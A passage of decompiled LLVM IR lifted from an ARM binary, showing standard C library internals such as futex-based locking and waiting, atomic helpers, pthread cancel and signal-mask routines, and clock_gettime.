dec_label_pc_10a08:                               ; preds = %entry
  %v0_10a08 = call i32 @__a_barrier()
  store i32 %v0_10a08, i32* @r0, align 4
  %v2_10a10 = inttoptr i32 %v0_10a08 to i32*
  store i32 0, i32* %v2_10a10, align 4
  %v0_10a14 = call i32 @__a_barrier()
  %v1_10a18 = add i32 %v0_10a14, 4
  %v2_10a18 = inttoptr i32 %v1_10a18 to i32*
  %v3_10a18 = load i32, i32* %v2_10a18, align 4
  %v2_10a1c = icmp eq i32 %v3_10a18, 0
  br i1 %v2_10a1c, label %dec_label_pc_10a58, label %dec_label_pc_10a24

dec_label_pc_10a24:                               ; preds = %dec_label_pc_10a08
  %v0_10a28 = load i32, i32* @r4, align 4
  %v4_10a34 = call i32 @___syscall3.6(i32 240, i32 %v0_10a28, i32 129, i32 1)
  %v4_10a3c = icmp eq i32 %v4_10a34, -38
  br i1 %v4_10a3c, label %dec_label_pc_10a40, label %dec_label_pc_10a58

dec_label_pc_10a40:                               ; preds = %dec_label_pc_10a24
  %v0_10a44 = load i32, i32* @r4, align 4
  %v4_10a54 = call i32 @___syscall3.6(i32 240, i32 %v0_10a44, i32 1, i32 1)
  br label %dec_label_pc_10a58

dec_label_pc_10a58:                               ; preds = %dec_label_pc_10a24, %dec_label_pc_10a08, %entry, %dec_label_pc_10a40
  %v1_10a5c = phi i32 [ %v4_10a34, %dec_label_pc_10a24 ], [ %v0_10a14, %dec_label_pc_10a08 ], [ %v0_109f4, %entry ], [ %v4_10a54, %dec_label_pc_10a40 ]
  %v2_10a58 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_10a58, i32* @r4, align 4
  ret i32 %v1_10a5c

; uselistorder directives
  uselistorder i32 (i32, i32, i32, i32)* @___syscall3.6, { 1, 0 }
  uselistorder label %dec_label_pc_10a58, { 3, 0, 1, 2 }
}

define i32 @__lock(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_10a64 = load i32, i32* @global_var_23e94.445, align 4
  %v2_10a68 = icmp eq i32 %v3_10a64, 0
  store i1 %v2_10a68, i1* @cpsr_z, align 1
  %v3_10a6c = load i32, i32* @r4, align 4
  store i32 %v3_10a6c, i32* %stack_var_-16, align 4
  %v6_10a6c = load i32, i32* @r5, align 4
  %v9_10a6c = load i32, i32* @r6, align 4
  %v0_10a70 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10a70, i32* @r4, align 4
  br i1 %v2_10a68, label %dec_label_pc_10ab8, label %dec_label_pc_10a84.preheader

dec_label_pc_10a84.preheader:                     ; preds = %entry
  %v2_10a74 = add i32 %v0_10a70, 4
  store i32 %v2_10a74, i32* @r6, align 4
  br label %dec_label_pc_10a84

dec_label_pc_10a80:                               ; preds = %dec_label_pc_10aa0
  %v2_10a80 = inttoptr i32 %v0_10aa8 to i32*
  %v3_10a80 = call i32 @__wait(i32* %v2_10a80, i32 %v0_10aac)
  store i32 %v3_10a80, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10a84.backedge

dec_label_pc_10a84.backedge:                      ; preds = %dec_label_pc_10a80, %dec_label_pc_10a84
  %v0_10a84.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10a84

dec_label_pc_10a84:                               ; preds = %dec_label_pc_10a84.backedge, %dec_label_pc_10a84.preheader
  %v0_10a84 = phi i32 [ %v0_10a84.pre, %dec_label_pc_10a84.backedge ], [ %v0_10a70, %dec_label_pc_10a84.preheader ]
  %v1_10a84 = inttoptr i32 %v0_10a84 to i32*
  %v2_10a84 = load i32, i32* %v1_10a84, align 4
  store i32 %v2_10a84, i32* @r5, align 4
  store i32 %v0_10a84, i32* @r2, align 4
  store i32 %v2_10a84, i32* %r0.global-to-local, align 4
  %v3_10a94 = call i32 @__a_cas(i32 %v2_10a84, i32 1, i32 %v0_10a84)
  store i32 %v3_10a94, i32* %r0.global-to-local, align 4
  %v2_10a98 = icmp eq i32 %v3_10a94, 0
  store i1 %v2_10a98, i1* @cpsr_z, align 1
  br i1 %v2_10a98, label %dec_label_pc_10aa0, label %dec_label_pc_10a84.backedge

dec_label_pc_10aa0:                               ; preds = %dec_label_pc_10a84
  store i32 1, i32* @r2, align 4
  %v0_10aa4 = load i32, i32* @r5, align 4
  %v2_10aa4 = icmp eq i32 %v0_10aa4, 0
  %v0_10aa8 = load i32, i32* @r4, align 4
  store i32 %v0_10aa8, i32* %r0.global-to-local, align 4
  %v0_10aac = load i32, i32* @r6, align 4
  store i32 %v0_10aac, i32* @r1, align 4
  store i32 1, i32* @r3, align 4
  br i1 %v2_10aa4, label %dec_label_pc_10ab8.loopexit, label %dec_label_pc_10a80

dec_label_pc_10ab8.loopexit:                      ; preds = %dec_label_pc_10aa0
  %v2_10ab8.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_10ab8

dec_label_pc_10ab8:                               ; preds = %dec_label_pc_10ab8.loopexit, %entry
  %v1_10abc = phi i32 [ %v0_10aa8, %dec_label_pc_10ab8.loopexit ], [ %v0_10a70, %entry ]
  %v2_10ab8 = phi i32 [ %v2_10ab8.pre, %dec_label_pc_10ab8.loopexit ], [ %v3_10a6c, %entry ]
  store i32 %v2_10ab8, i32* @r4, align 4
  store i32 %v6_10a6c, i32* @r5, align 4
  store i32 %v9_10a6c, i32* @r6, align 4
  ret i32 %v1_10abc

; uselistorder directives
  uselistorder i32 %v0_10aac, { 1, 0 }
  uselistorder i32 %v0_10aa8, { 0, 2, 1 }
  uselistorder i32 %v0_10a84, { 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_10a84.backedge, { 1, 0 }
}

define i32 @__syscall_cp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  %v0_10ac4 = load i32, i32* @lr, align 4
  store i32 68336, i32* @lr, align 4
  %v1_10aec = call i32 @sccp()
  store i32 %v0_10ac4, i32* @lr, align 4
  ret i32 %v1_10aec
}

define i32 @sccp() local_unnamed_addr {
entry:
  %v0_10b20 = call i32 @__syscall()
  ret i32 %v0_10b20
}

define i32 @___syscall4.7(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  ret i32 %arg2
}

define i32 @a_fetch_add(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_10b54 = load i32, i32* @r4, align 4
  store i32 %v3_10b54, i32* %stack_var_-16, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10b60

dec_label_pc_10b60:                               ; preds = %dec_label_pc_10b60.dec_label_pc_10b60_crit_edge, %entry
  %v0_10b6c = phi i32 [ %v0_10b6c.pre, %dec_label_pc_10b60.dec_label_pc_10b60_crit_edge ], [ %arg2, %entry ]
  %v0_10b60 = phi i32 [ %v0_10b60.pre, %dec_label_pc_10b60.dec_label_pc_10b60_crit_edge ], [ %tmp, %entry ]
  %v1_10b60 = inttoptr i32 %v0_10b60 to i32*
  %v2_10b60 = load i32, i32* %v1_10b60, align 4
  store i32 %v2_10b60, i32* %r4.global-to-local, align 4
  store i32 %v0_10b60, i32* @r2, align 4
  %v2_10b6c = add i32 %v2_10b60, %v0_10b6c
  %v3_10b70 = call i32 @__a_cas(i32 %v2_10b60, i32 %v2_10b6c, i32 %v0_10b60)
  %v2_10b74 = icmp eq i32 %v3_10b70, 0
  store i1 %v2_10b74, i1* @cpsr_z, align 1
  br i1 %v2_10b74, label %dec_label_pc_10b7c, label %dec_label_pc_10b60.dec_label_pc_10b60_crit_edge

dec_label_pc_10b60.dec_label_pc_10b60_crit_edge:  ; preds = %dec_label_pc_10b60
  %v0_10b60.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_10b6c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10b60

dec_label_pc_10b7c:                               ; preds = %dec_label_pc_10b60
  %v0_10b7c = load i32, i32* %r4.global-to-local, align 4
  %v2_10b80 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_10b80, i32* %r4.global-to-local, align 4
  ret i32 %v0_10b7c

; uselistorder directives
  uselistorder i32 %v2_10b60, { 1, 0, 2 }
  uselistorder i32 %v0_10b60, { 2, 1, 0 }
}

define i32 @__wait(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %v3_10b88 = load i32, i32* @r4, align 4
  %v6_10b88 = load i32, i32* @r5, align 4
  %v9_10b88 = load i32, i32* @r6, align 4
  %v12_10b88 = load i32, i32* @r7, align 4
  %v15_10b88 = load i32, i32* @r8, align 4
  %v18_10b88 = load i32, i32* @sl, align 4
  %v21_10b88 = load i32, i32* @lr, align 4
  %v0_10b8c = load i32, i32* @r3, align 4
  %v2_10b8c = icmp eq i32 %v0_10b8c, 0
  %v0_10b90 = load i32, i32* @r2, align 4
  store i32 %v0_10b90, i32* %r8.global-to-local, align 4
  %. = select i1 %v2_10b8c, i32 0, i32 128
  store i32 %., i32* %sl.global-to-local, align 4
  %v0_10ba0 = load i32, i32* @r0, align 4
  store i32 %v0_10ba0, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 99, i32* @r2, align 4
  %v2_10bc827 = icmp eq i32 %arg2, 0
  br label %dec_label_pc_10bc8

dec_label_pc_10bb0:                               ; preds = %dec_label_pc_10bd0, %dec_label_pc_10bc8
  %v0_10bb0 = load i32, i32* @r6, align 4
  %v1_10bb0 = inttoptr i32 %v0_10bb0 to i32*
  %v2_10bb0 = load i32, i32* %v1_10bb0, align 4
  %v1_10bb4 = load i32, i32* %r8.global-to-local, align 4
  %v9_10bb4 = icmp eq i32 %v2_10bb0, %v1_10bb4
  store i1 %v9_10bb4, i1* @cpsr_z, align 1
  br i1 %v9_10bb4, label %dec_label_pc_10bbc, label %dec_label_pc_10c60

dec_label_pc_10bbc:                               ; preds = %dec_label_pc_10bb0
  %v0_10bbc = call i32 @__a_barrier()
  store i32 %v0_10bbc, i32* @r0, align 4
  %v0_10bc0.pre = load i32, i32* @r2, align 4
  %v0_10bc8.pre = load i32, i32* @r5, align 4
  %v1_10bc0 = add i32 %v0_10bc0.pre, -1
  store i32 %v1_10bc0, i32* @r2, align 4
  %v2_10bc0 = icmp eq i32 %v0_10bc0.pre, 0
  %v2_10bc8 = icmp eq i32 %v0_10bc8.pre, 0
  store i1 %v2_10bc8, i1* @cpsr_z, align 1
  br i1 %v2_10bc0, label %dec_label_pc_10be0, label %dec_label_pc_10bc8

dec_label_pc_10bc8:                               ; preds = %entry, %dec_label_pc_10bbc
  %v2_10bc830 = phi i1 [ %v2_10bc827, %entry ], [ %v2_10bc8, %dec_label_pc_10bbc ]
  %v0_10be829 = phi i32 [ %arg2, %entry ], [ %v0_10bc8.pre, %dec_label_pc_10bbc ]
  %v1_10c68828 = phi i32 [ %v0_10ba0, %entry ], [ %v0_10bbc, %dec_label_pc_10bbc ]
  br i1 %v2_10bc830, label %dec_label_pc_10bb0, label %dec_label_pc_10bd0

dec_label_pc_10bd0:                               ; preds = %dec_label_pc_10bc8
  %v1_10bd0 = inttoptr i32 %v0_10be829 to i32*
  %v2_10bd0 = load i32, i32* %v1_10bd0, align 4
  %v2_10bd4 = icmp eq i32 %v2_10bd0, 0
  store i1 %v2_10bd4, i1* @cpsr_z, align 1
  br i1 %v2_10bd4, label %dec_label_pc_10bb0, label %dec_label_pc_10be8

dec_label_pc_10be0:                               ; preds = %dec_label_pc_10bbc
  br i1 %v2_10bc8, label %dec_label_pc_10c24, label %dec_label_pc_10be0.dec_label_pc_10be8_crit_edge

dec_label_pc_10be0.dec_label_pc_10be8_crit_edge:  ; preds = %dec_label_pc_10be0
  %.pre = inttoptr i32 %v0_10bc8.pre to i32*
  br label %dec_label_pc_10be8

dec_label_pc_10be8:                               ; preds = %dec_label_pc_10bd0, %dec_label_pc_10be0.dec_label_pc_10be8_crit_edge
  %v2_10bf0.pre-phi = phi i32* [ %.pre, %dec_label_pc_10be0.dec_label_pc_10be8_crit_edge ], [ %v1_10bd0, %dec_label_pc_10bd0 ]
  %v3_10bf0 = call i32 @a_fetch_add(i32* %v2_10bf0.pre-phi, i32 1)
  br label %dec_label_pc_10c24

dec_label_pc_10bf8:                               ; preds = %dec_label_pc_10c28
  %v0_10c34 = load i32, i32* %sl.global-to-local, align 4
  %v0_10bf8 = load i32, i32* %r7.global-to-local, align 4
  %v5_10bfc = call i32 @___syscall4.7(i32 240, i32 %v0_10c28, i32 %v0_10c34, i32 %v2_10c28, i32 %v0_10bf8)
  %v4_10c04 = icmp eq i32 %v5_10bfc, -38
  br i1 %v4_10c04, label %dec_label_pc_10c08, label %dec_label_pc_10c28

dec_label_pc_10c08:                               ; preds = %dec_label_pc_10bf8
  %v0_10c08 = load i32, i32* %r4.global-to-local, align 4
  %v0_10c0c = load i32, i32* @r6, align 4
  %v0_10c10 = load i32, i32* %r7.global-to-local, align 4
  %v5_10c1c = call i32 @___syscall4.7(i32 240, i32 %v0_10c0c, i32 %v0_10c10, i32 %v0_10c08, i32 %v0_10c10)
  br label %dec_label_pc_10c28

dec_label_pc_10c24:                               ; preds = %dec_label_pc_10be0, %dec_label_pc_10be8
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10c28

dec_label_pc_10c28:                               ; preds = %dec_label_pc_10bf8, %dec_label_pc_10c08, %dec_label_pc_10c24
  %v0_10c28 = load i32, i32* @r6, align 4
  %v1_10c28 = inttoptr i32 %v0_10c28 to i32*
  %v2_10c28 = load i32, i32* %v1_10c28, align 4
  store i32 %v2_10c28, i32* %r4.global-to-local, align 4
  %v1_10c2c = load i32, i32* %r8.global-to-local, align 4
  %v9_10c2c = icmp eq i32 %v2_10c28, %v1_10c2c
  br i1 %v9_10c2c, label %dec_label_pc_10bf8, label %dec_label_pc_10c44

dec_label_pc_10c44:                               ; preds = %dec_label_pc_10c28
  %v0_10c44 = load i32, i32* @r5, align 4
  %v2_10c44 = icmp eq i32 %v0_10c44, 0
  store i1 %v2_10c44, i1* @cpsr_z, align 1
  br i1 %v2_10c44, label %dec_label_pc_10c60, label %dec_label_pc_10c4c

dec_label_pc_10c4c:                               ; preds = %dec_label_pc_10c44
  store i32 %v3_10b88, i32* @r4, align 4
  store i32 %v12_10b88, i32* %r7.global-to-local, align 4
  store i32 %v15_10b88, i32* %r8.global-to-local, align 4
  store i32 %v18_10b88, i32* %sl.global-to-local, align 4
  store i32 %v21_10b88, i32* @lr, align 4
  %v2_10c5c = inttoptr i32 %v0_10c44 to i32*
  %v3_10c5c = call i32 @a_fetch_add(i32* %v2_10c5c, i32 -1)
  br label %dec_label_pc_10c60

dec_label_pc_10c60:                               ; preds = %dec_label_pc_10bb0, %dec_label_pc_10c44, %dec_label_pc_10c4c
  %v1_10c68 = phi i32 [ 240, %dec_label_pc_10c44 ], [ %v3_10c5c, %dec_label_pc_10c4c ], [ %v1_10c68828, %dec_label_pc_10bb0 ]
  store i32 %v3_10b88, i32* @r4, align 4
  store i32 %v6_10b88, i32* @r5, align 4
  store i32 %v9_10b88, i32* @r6, align 4
  store i32 %v12_10b88, i32* @r7, align 4
  store i32 %v15_10b88, i32* @r8, align 4
  store i32 %v18_10b88, i32* @sl, align 4
  store i32 %v21_10b88, i32* @lr, align 4
  ret i32 %v1_10c68

; uselistorder directives
  uselistorder i32 %v2_10c28, { 1, 2, 0 }
  uselistorder i32 %v0_10c28, { 1, 0 }
  uselistorder i32 %v0_10bc8.pre, { 0, 2, 1 }
  uselistorder i32 %v21_10b88, { 1, 0 }
  uselistorder i32 %v18_10b88, { 1, 0 }
  uselistorder i32 %v15_10b88, { 1, 0 }
  uselistorder i32 %v12_10b88, { 1, 0 }
  uselistorder i32 %v3_10b88, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 1, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @___syscall4.7, { 1, 0 }
  uselistorder label %dec_label_pc_10c60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10c28, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10c24, { 1, 0 }
  uselistorder label %dec_label_pc_10be8, { 1, 0 }
  uselistorder label %dec_label_pc_10bc8, { 1, 0 }
}

define i32 @_dummy.8() local_unnamed_addr {
entry:
  %v1_10c6c = load i32, i32* @r0, align 4
  ret i32 %v1_10c6c
}

define i32 @_pthread_cleanup_push(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %v2_10c74 = add i32 %tmp, 4
  %v3_10c74 = inttoptr i32 %v2_10c74 to i32*
  store i32 %arg3, i32* %v3_10c74, align 4
  store i32 %arg2, i32* %arg1, align 4
  %v1_10c88 = call i32 @_dummy.8()
  ret i32 %v1_10c88
}

define i32 @_pthread_cleanup_pop(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %v1_10cb4 = call i32 @_dummy.8()
  store i32 %v1_10cb4, i32* %r0.global-to-local, align 4
  %v2_10cb8 = icmp eq i32 %arg2, 0
  br i1 %v2_10cb8, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v1_10cbc = load i32, i32* %r5.global-to-local, align 4
  %v2_10cbc = add i32 %v1_10cbc, 4
  %v3_10cbc = inttoptr i32 %v2_10cbc to i32*
  %v4_10cbc = load i32, i32* %v3_10cbc, align 4
  store i32 %v4_10cbc, i32* %r0.global-to-local, align 4
  %v2_10cc0 = inttoptr i32 %v1_10cbc to i32*
  %v3_10cc0 = load i32, i32* %v2_10cc0, align 4
  store i32 %v3_10cc0, i32* @ip, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %.02 = phi i32 [ %v3_10cc0, %bb ], [ undef, %entry ]
  %v2_10cc8 = xor i1 %v2_10cb8, true
  call void @__pseudo_cond_branch(i1 %v2_10cc8, i32 %.02)
  %v1_10cd4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_10cd4

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder i32 ()* @_dummy.8, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__pthread_setcancelstate(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 %arg1, i32* @r2, align 4
  %v0_10ce4 = load i32, i32* @lr, align 4
  store i32 %v0_10ce4, i32* %stack_var_-4, align 4
  %tmp = icmp ugt i32 %arg1, 2
  br i1 %tmp, label %.thread5, label %dec_label_pc_10cf0

.thread5:                                         ; preds = %entry
  br label %dec_label_pc_10d08

dec_label_pc_10cf0:                               ; preds = %entry
  %v0_10cf0 = call i32 @__aeabi_read_tp()
  %v2_10cf4 = icmp eq i32* %arg2, null
  %.pre = add i32 %v0_10cf0, -156
  %.pre4 = inttoptr i32 %.pre to i32*
  br i1 %v2_10cf4, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_10cf0
  %v4_10cf8 = load i32, i32* %.pre4, align 4
  store i32 %v4_10cf8, i32* %arg2, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_10cf0, %bb
  %v0_10d00 = load i32, i32* @r2, align 4
  store i32 %v0_10d00, i32* %.pre4, align 4
  %v2_10d08.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_10d08

dec_label_pc_10d08:                               ; preds = %.thread5, %.thread
  %v2_10d08 = phi i32 [ %v2_10d08.pre, %.thread ], [ %v0_10ce4, %.thread5 ]
  %v1_10d0c = phi i32 [ 0, %.thread ], [ 22, %.thread5 ]
  store i32 %v2_10d08, i32* @lr, align 4
  ret i32 %v1_10d0c

; uselistorder directives
  uselistorder label %dec_label_pc_10d08, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @pthread_sigmask() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_10d10 = load i32, i32* @r0, align 4
  %v0_10d14 = load i32, i32* @r7, align 4
  store i32 %v0_10d14, i32* %stack_var_-4, align 4
  %v0_10d18 = load i32, i32* @r2, align 4
  store i32 %v0_10d18, i32* @ip, align 4
  %tmp = icmp ugt i32 %v0_10d10, 2
  br i1 %tmp, label %.thread7, label %dec_label_pc_10d24

.thread7:                                         ; preds = %entry
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10d60

dec_label_pc_10d24:                               ; preds = %entry
  %v1_10d30 = sub i32 0, %v0_10d10
  store i32 %v1_10d30, i32* %r0.global-to-local, align 4
  %v1_10d34 = add i32 %v0_10d10, 1
  %v2_10d34 = icmp ult i32 %v1_10d30, 2
  br i1 %v2_10d34, label %bb11, label %bb

bb:                                               ; preds = %dec_label_pc_10d24
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_10d24, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_10d34, %dec_label_pc_10d24 ]
  %v0_10d44.pr = phi i32 [ 0, %bb ], [ %v1_10d34, %dec_label_pc_10d24 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v2_10d3c = icmp eq i32 %v0_10d18, 0
  br i1 %v2_10d3c, label %.thread, label %bb12

.thread:                                          ; preds = %bb11
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10d60

bb12:                                             ; preds = %bb11
  %v2_10d44 = icmp eq i32 %v0_10d44.pr, 0
  br i1 %v2_10d44, label %dec_label_pc_10d60, label %dec_label_pc_10d4c

dec_label_pc_10d4c:                               ; preds = %bb12
  %v1_10d4c = inttoptr i32 %v0_10d18 to i32*
  %v2_10d4c = load i32, i32* %v1_10d4c, align 4
  %v1_10d50 = add i32 %v0_10d18, 4
  %v2_10d50 = inttoptr i32 %v1_10d50 to i32*
  %v3_10d50 = load i32, i32* %v2_10d50, align 4
  %tmp13 = bitcast i32 %v2_10d4c to float
  %tmp14 = call float @fabsf(float %tmp13)
  %v1_10d54 = bitcast float %tmp14 to i32
  %v1_10d58 = and i32 %v3_10d50, -4
  store i32 %v1_10d58, i32* %r3.global-to-local, align 4
  store i32 %v1_10d54, i32* %v1_10d4c, align 4
  %v5_10d5c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_10d5c, i32* %v2_10d50, align 4
  %v2_10d60.pre = load i32, i32* %stack_var_-4, align 4
  %v1_10d64.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10d60

dec_label_pc_10d60:                               ; preds = %.thread7, %.thread, %bb12, %dec_label_pc_10d4c
  %v1_10d64 = phi i32 [ %v1_10d30, %.thread ], [ %v1_10d30, %bb12 ], [ %v1_10d64.pre, %dec_label_pc_10d4c ], [ 22, %.thread7 ]
  %v2_10d60 = phi i32 [ %v0_10d14, %.thread ], [ %v0_10d14, %bb12 ], [ %v2_10d60.pre, %dec_label_pc_10d4c ], [ %v0_10d14, %.thread7 ]
  store i32 %v2_10d60, i32* @r7, align 4
  ret i32 %v1_10d64

; uselistorder directives
  uselistorder i32 %v0_10d10, { 1, 2, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10d60, { 3, 2, 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @_dummy.9() local_unnamed_addr {
entry:
  %v1_10d68 = load i32, i32* @r0, align 4
  ret i32 %v1_10d68
}

define i32 @__pthread_testcancel(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10d7c = call i32 @_dummy.9()
  ret i32 %v1_10d7c
}

define i32 @__clock_gettime(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v6_10d90 = load i32, i32* @r5, align 4
  %v9_10d90 = load i32, i32* @r6, align 4
  %v12_10d90 = load i32, i32* @r7, align 4
  %v2_10d98 = load i32, i32* @global_var_23d30.583, align 4
  %v2_10d9c = icmp eq i32 %v2_10d98, 0
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  br i1 %v2_10d9c, label %dec_label_pc_10db0, label %dec_label_pc_10df0

dec_label_pc_10db0:                               ; preds = %entry
  %v5_10db8 = call i32 @__vdsosym(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_19d98.585, i32 0, i32 0), i32 ptrtoint ([21 x i8]* @global_var_19da4.587 to i32))
  %v2_10dc0 = icmp eq i32 %v5_10db8, 0
  store i1 %v2_10dc0, i1* @cpsr_z, align 1
  %storemerge = select i1 %v2_10dc0, i32 ptrtoint (i32* @global_var_10e24.589 to i32), i32 %v5_10db8
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23d30.583 to i32), i32* @r2, align 4
  %v3_10dd813 = call i32 @__a_cas(i32 0, i32 %storemerge, i32 ptrtoint (i32* @global_var_23d30.583 to i32))
  %v2_10ddc15 = icmp eq i32 %v3_10dd813, 0
  %v2_10df8.pre.pre16 = load i32, i32* @global_var_23d30.583, align 4
  br i1 %v2_10ddc15, label %dec_label_pc_10df0.loopexit, label %dec_label_pc_10de4

dec_label_pc_10de4:                               ; preds = %dec_label_pc_10db0, %dec_label_pc_10de4._crit_edge
  %v2_10df8.pre.pre17 = phi i32 [ %v2_10df8.pre.pre, %dec_label_pc_10de4._crit_edge ], [ %v2_10df8.pre.pre16, %dec_label_pc_10db0 ]
  %v2_10de8 = icmp eq i32 %v2_10df8.pre.pre17, 0
  store i1 %v2_10de8, i1* @cpsr_z, align 1
  br i1 %v2_10de8, label %dec_label_pc_10de4._crit_edge, label %dec_label_pc_10df0.loopexit

dec_label_pc_10de4._crit_edge:                    ; preds = %dec_label_pc_10de4
  %v0_10dd0.pre = load i32, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23d30.583 to i32), i32* @r2, align 4
  %v3_10dd8 = call i32 @__a_cas(i32 0, i32 %v0_10dd0.pre, i32 ptrtoint (i32* @global_var_23d30.583 to i32))
  %v2_10ddc = icmp eq i32 %v3_10dd8, 0
  %v2_10df8.pre.pre = load i32, i32* @global_var_23d30.583, align 4
  br i1 %v2_10ddc, label %dec_label_pc_10df0.loopexit, label %dec_label_pc_10de4

dec_label_pc_10df0.loopexit:                      ; preds = %dec_label_pc_10de4, %dec_label_pc_10de4._crit_edge, %dec_label_pc_10db0
  %v2_10df8.pre.pre.lcssa = phi i32 [ %v2_10df8.pre.pre16, %dec_label_pc_10db0 ], [ %v2_10df8.pre.pre, %dec_label_pc_10de4._crit_edge ], [ %v2_10df8.pre.pre17, %dec_label_pc_10de4 ]
  %v0_10df4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_10df0

dec_label_pc_10df0:                               ; preds = %dec_label_pc_10df0.loopexit, %entry
  %v2_10df8 = phi i32 [ %v2_10df8.pre.pre.lcssa, %dec_label_pc_10df0.loopexit ], [ %v2_10d98, %entry ]
  %v0_10df4 = phi i32 [ %v0_10df4.pre, %dec_label_pc_10df0.loopexit ], [ %arg1, %entry ]
  call void @__pseudo_branch(i32 %v2_10df8)
  store i32 %v6_10d90, i32* @r5, align 4
  store i32 %v9_10d90, i32* @r6, align 4
  store i32 %v12_10d90, i32* @r7, align 4
  ret i32 %v0_10df4

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_23d30.583 to i32), { 2, 3, 0, 1 }
  uselistorder i32* @global_var_23d30.583, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_10df0.loopexit, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10de4, { 1, 0 }
}

define i32 @sc_clock_gettime(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_10e38 = icmp eq i32 %arg1, 0
  br i1 %v2_10e38, label %dec_label_pc_10e90, label %dec_label_pc_10e40

dec_label_pc_10e40:                               ; preds = %entry
  %v4_10e44 = icmp eq i32 %arg1, -38
  br i1 %v4_10e44, label %bb, label %dec_label_pc_10e80

bb:                                               ; preds = %dec_label_pc_10e40
  br label %dec_label_pc_10e80

dec_label_pc_10e80:                               ; preds = %dec_label_pc_10e40, %bb
  %storemerge = phi i32 [ -22, %bb ], [ %arg1, %dec_label_pc_10e40 ]
  %v0_10e80 = call i32 @__errno_location()
  %v1_10e84 = sub i32 0, %storemerge
  %v2_10e88 = inttoptr i32 %v0_10e80 to i32*
  store i32 %v1_10e84, i32* %v2_10e88, align 4
  br label %dec_label_pc_10e90

dec_label_pc_10e90:                               ; preds = %entry, %dec_label_pc_10e80
  %v1_10e94 = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_10e80 ]
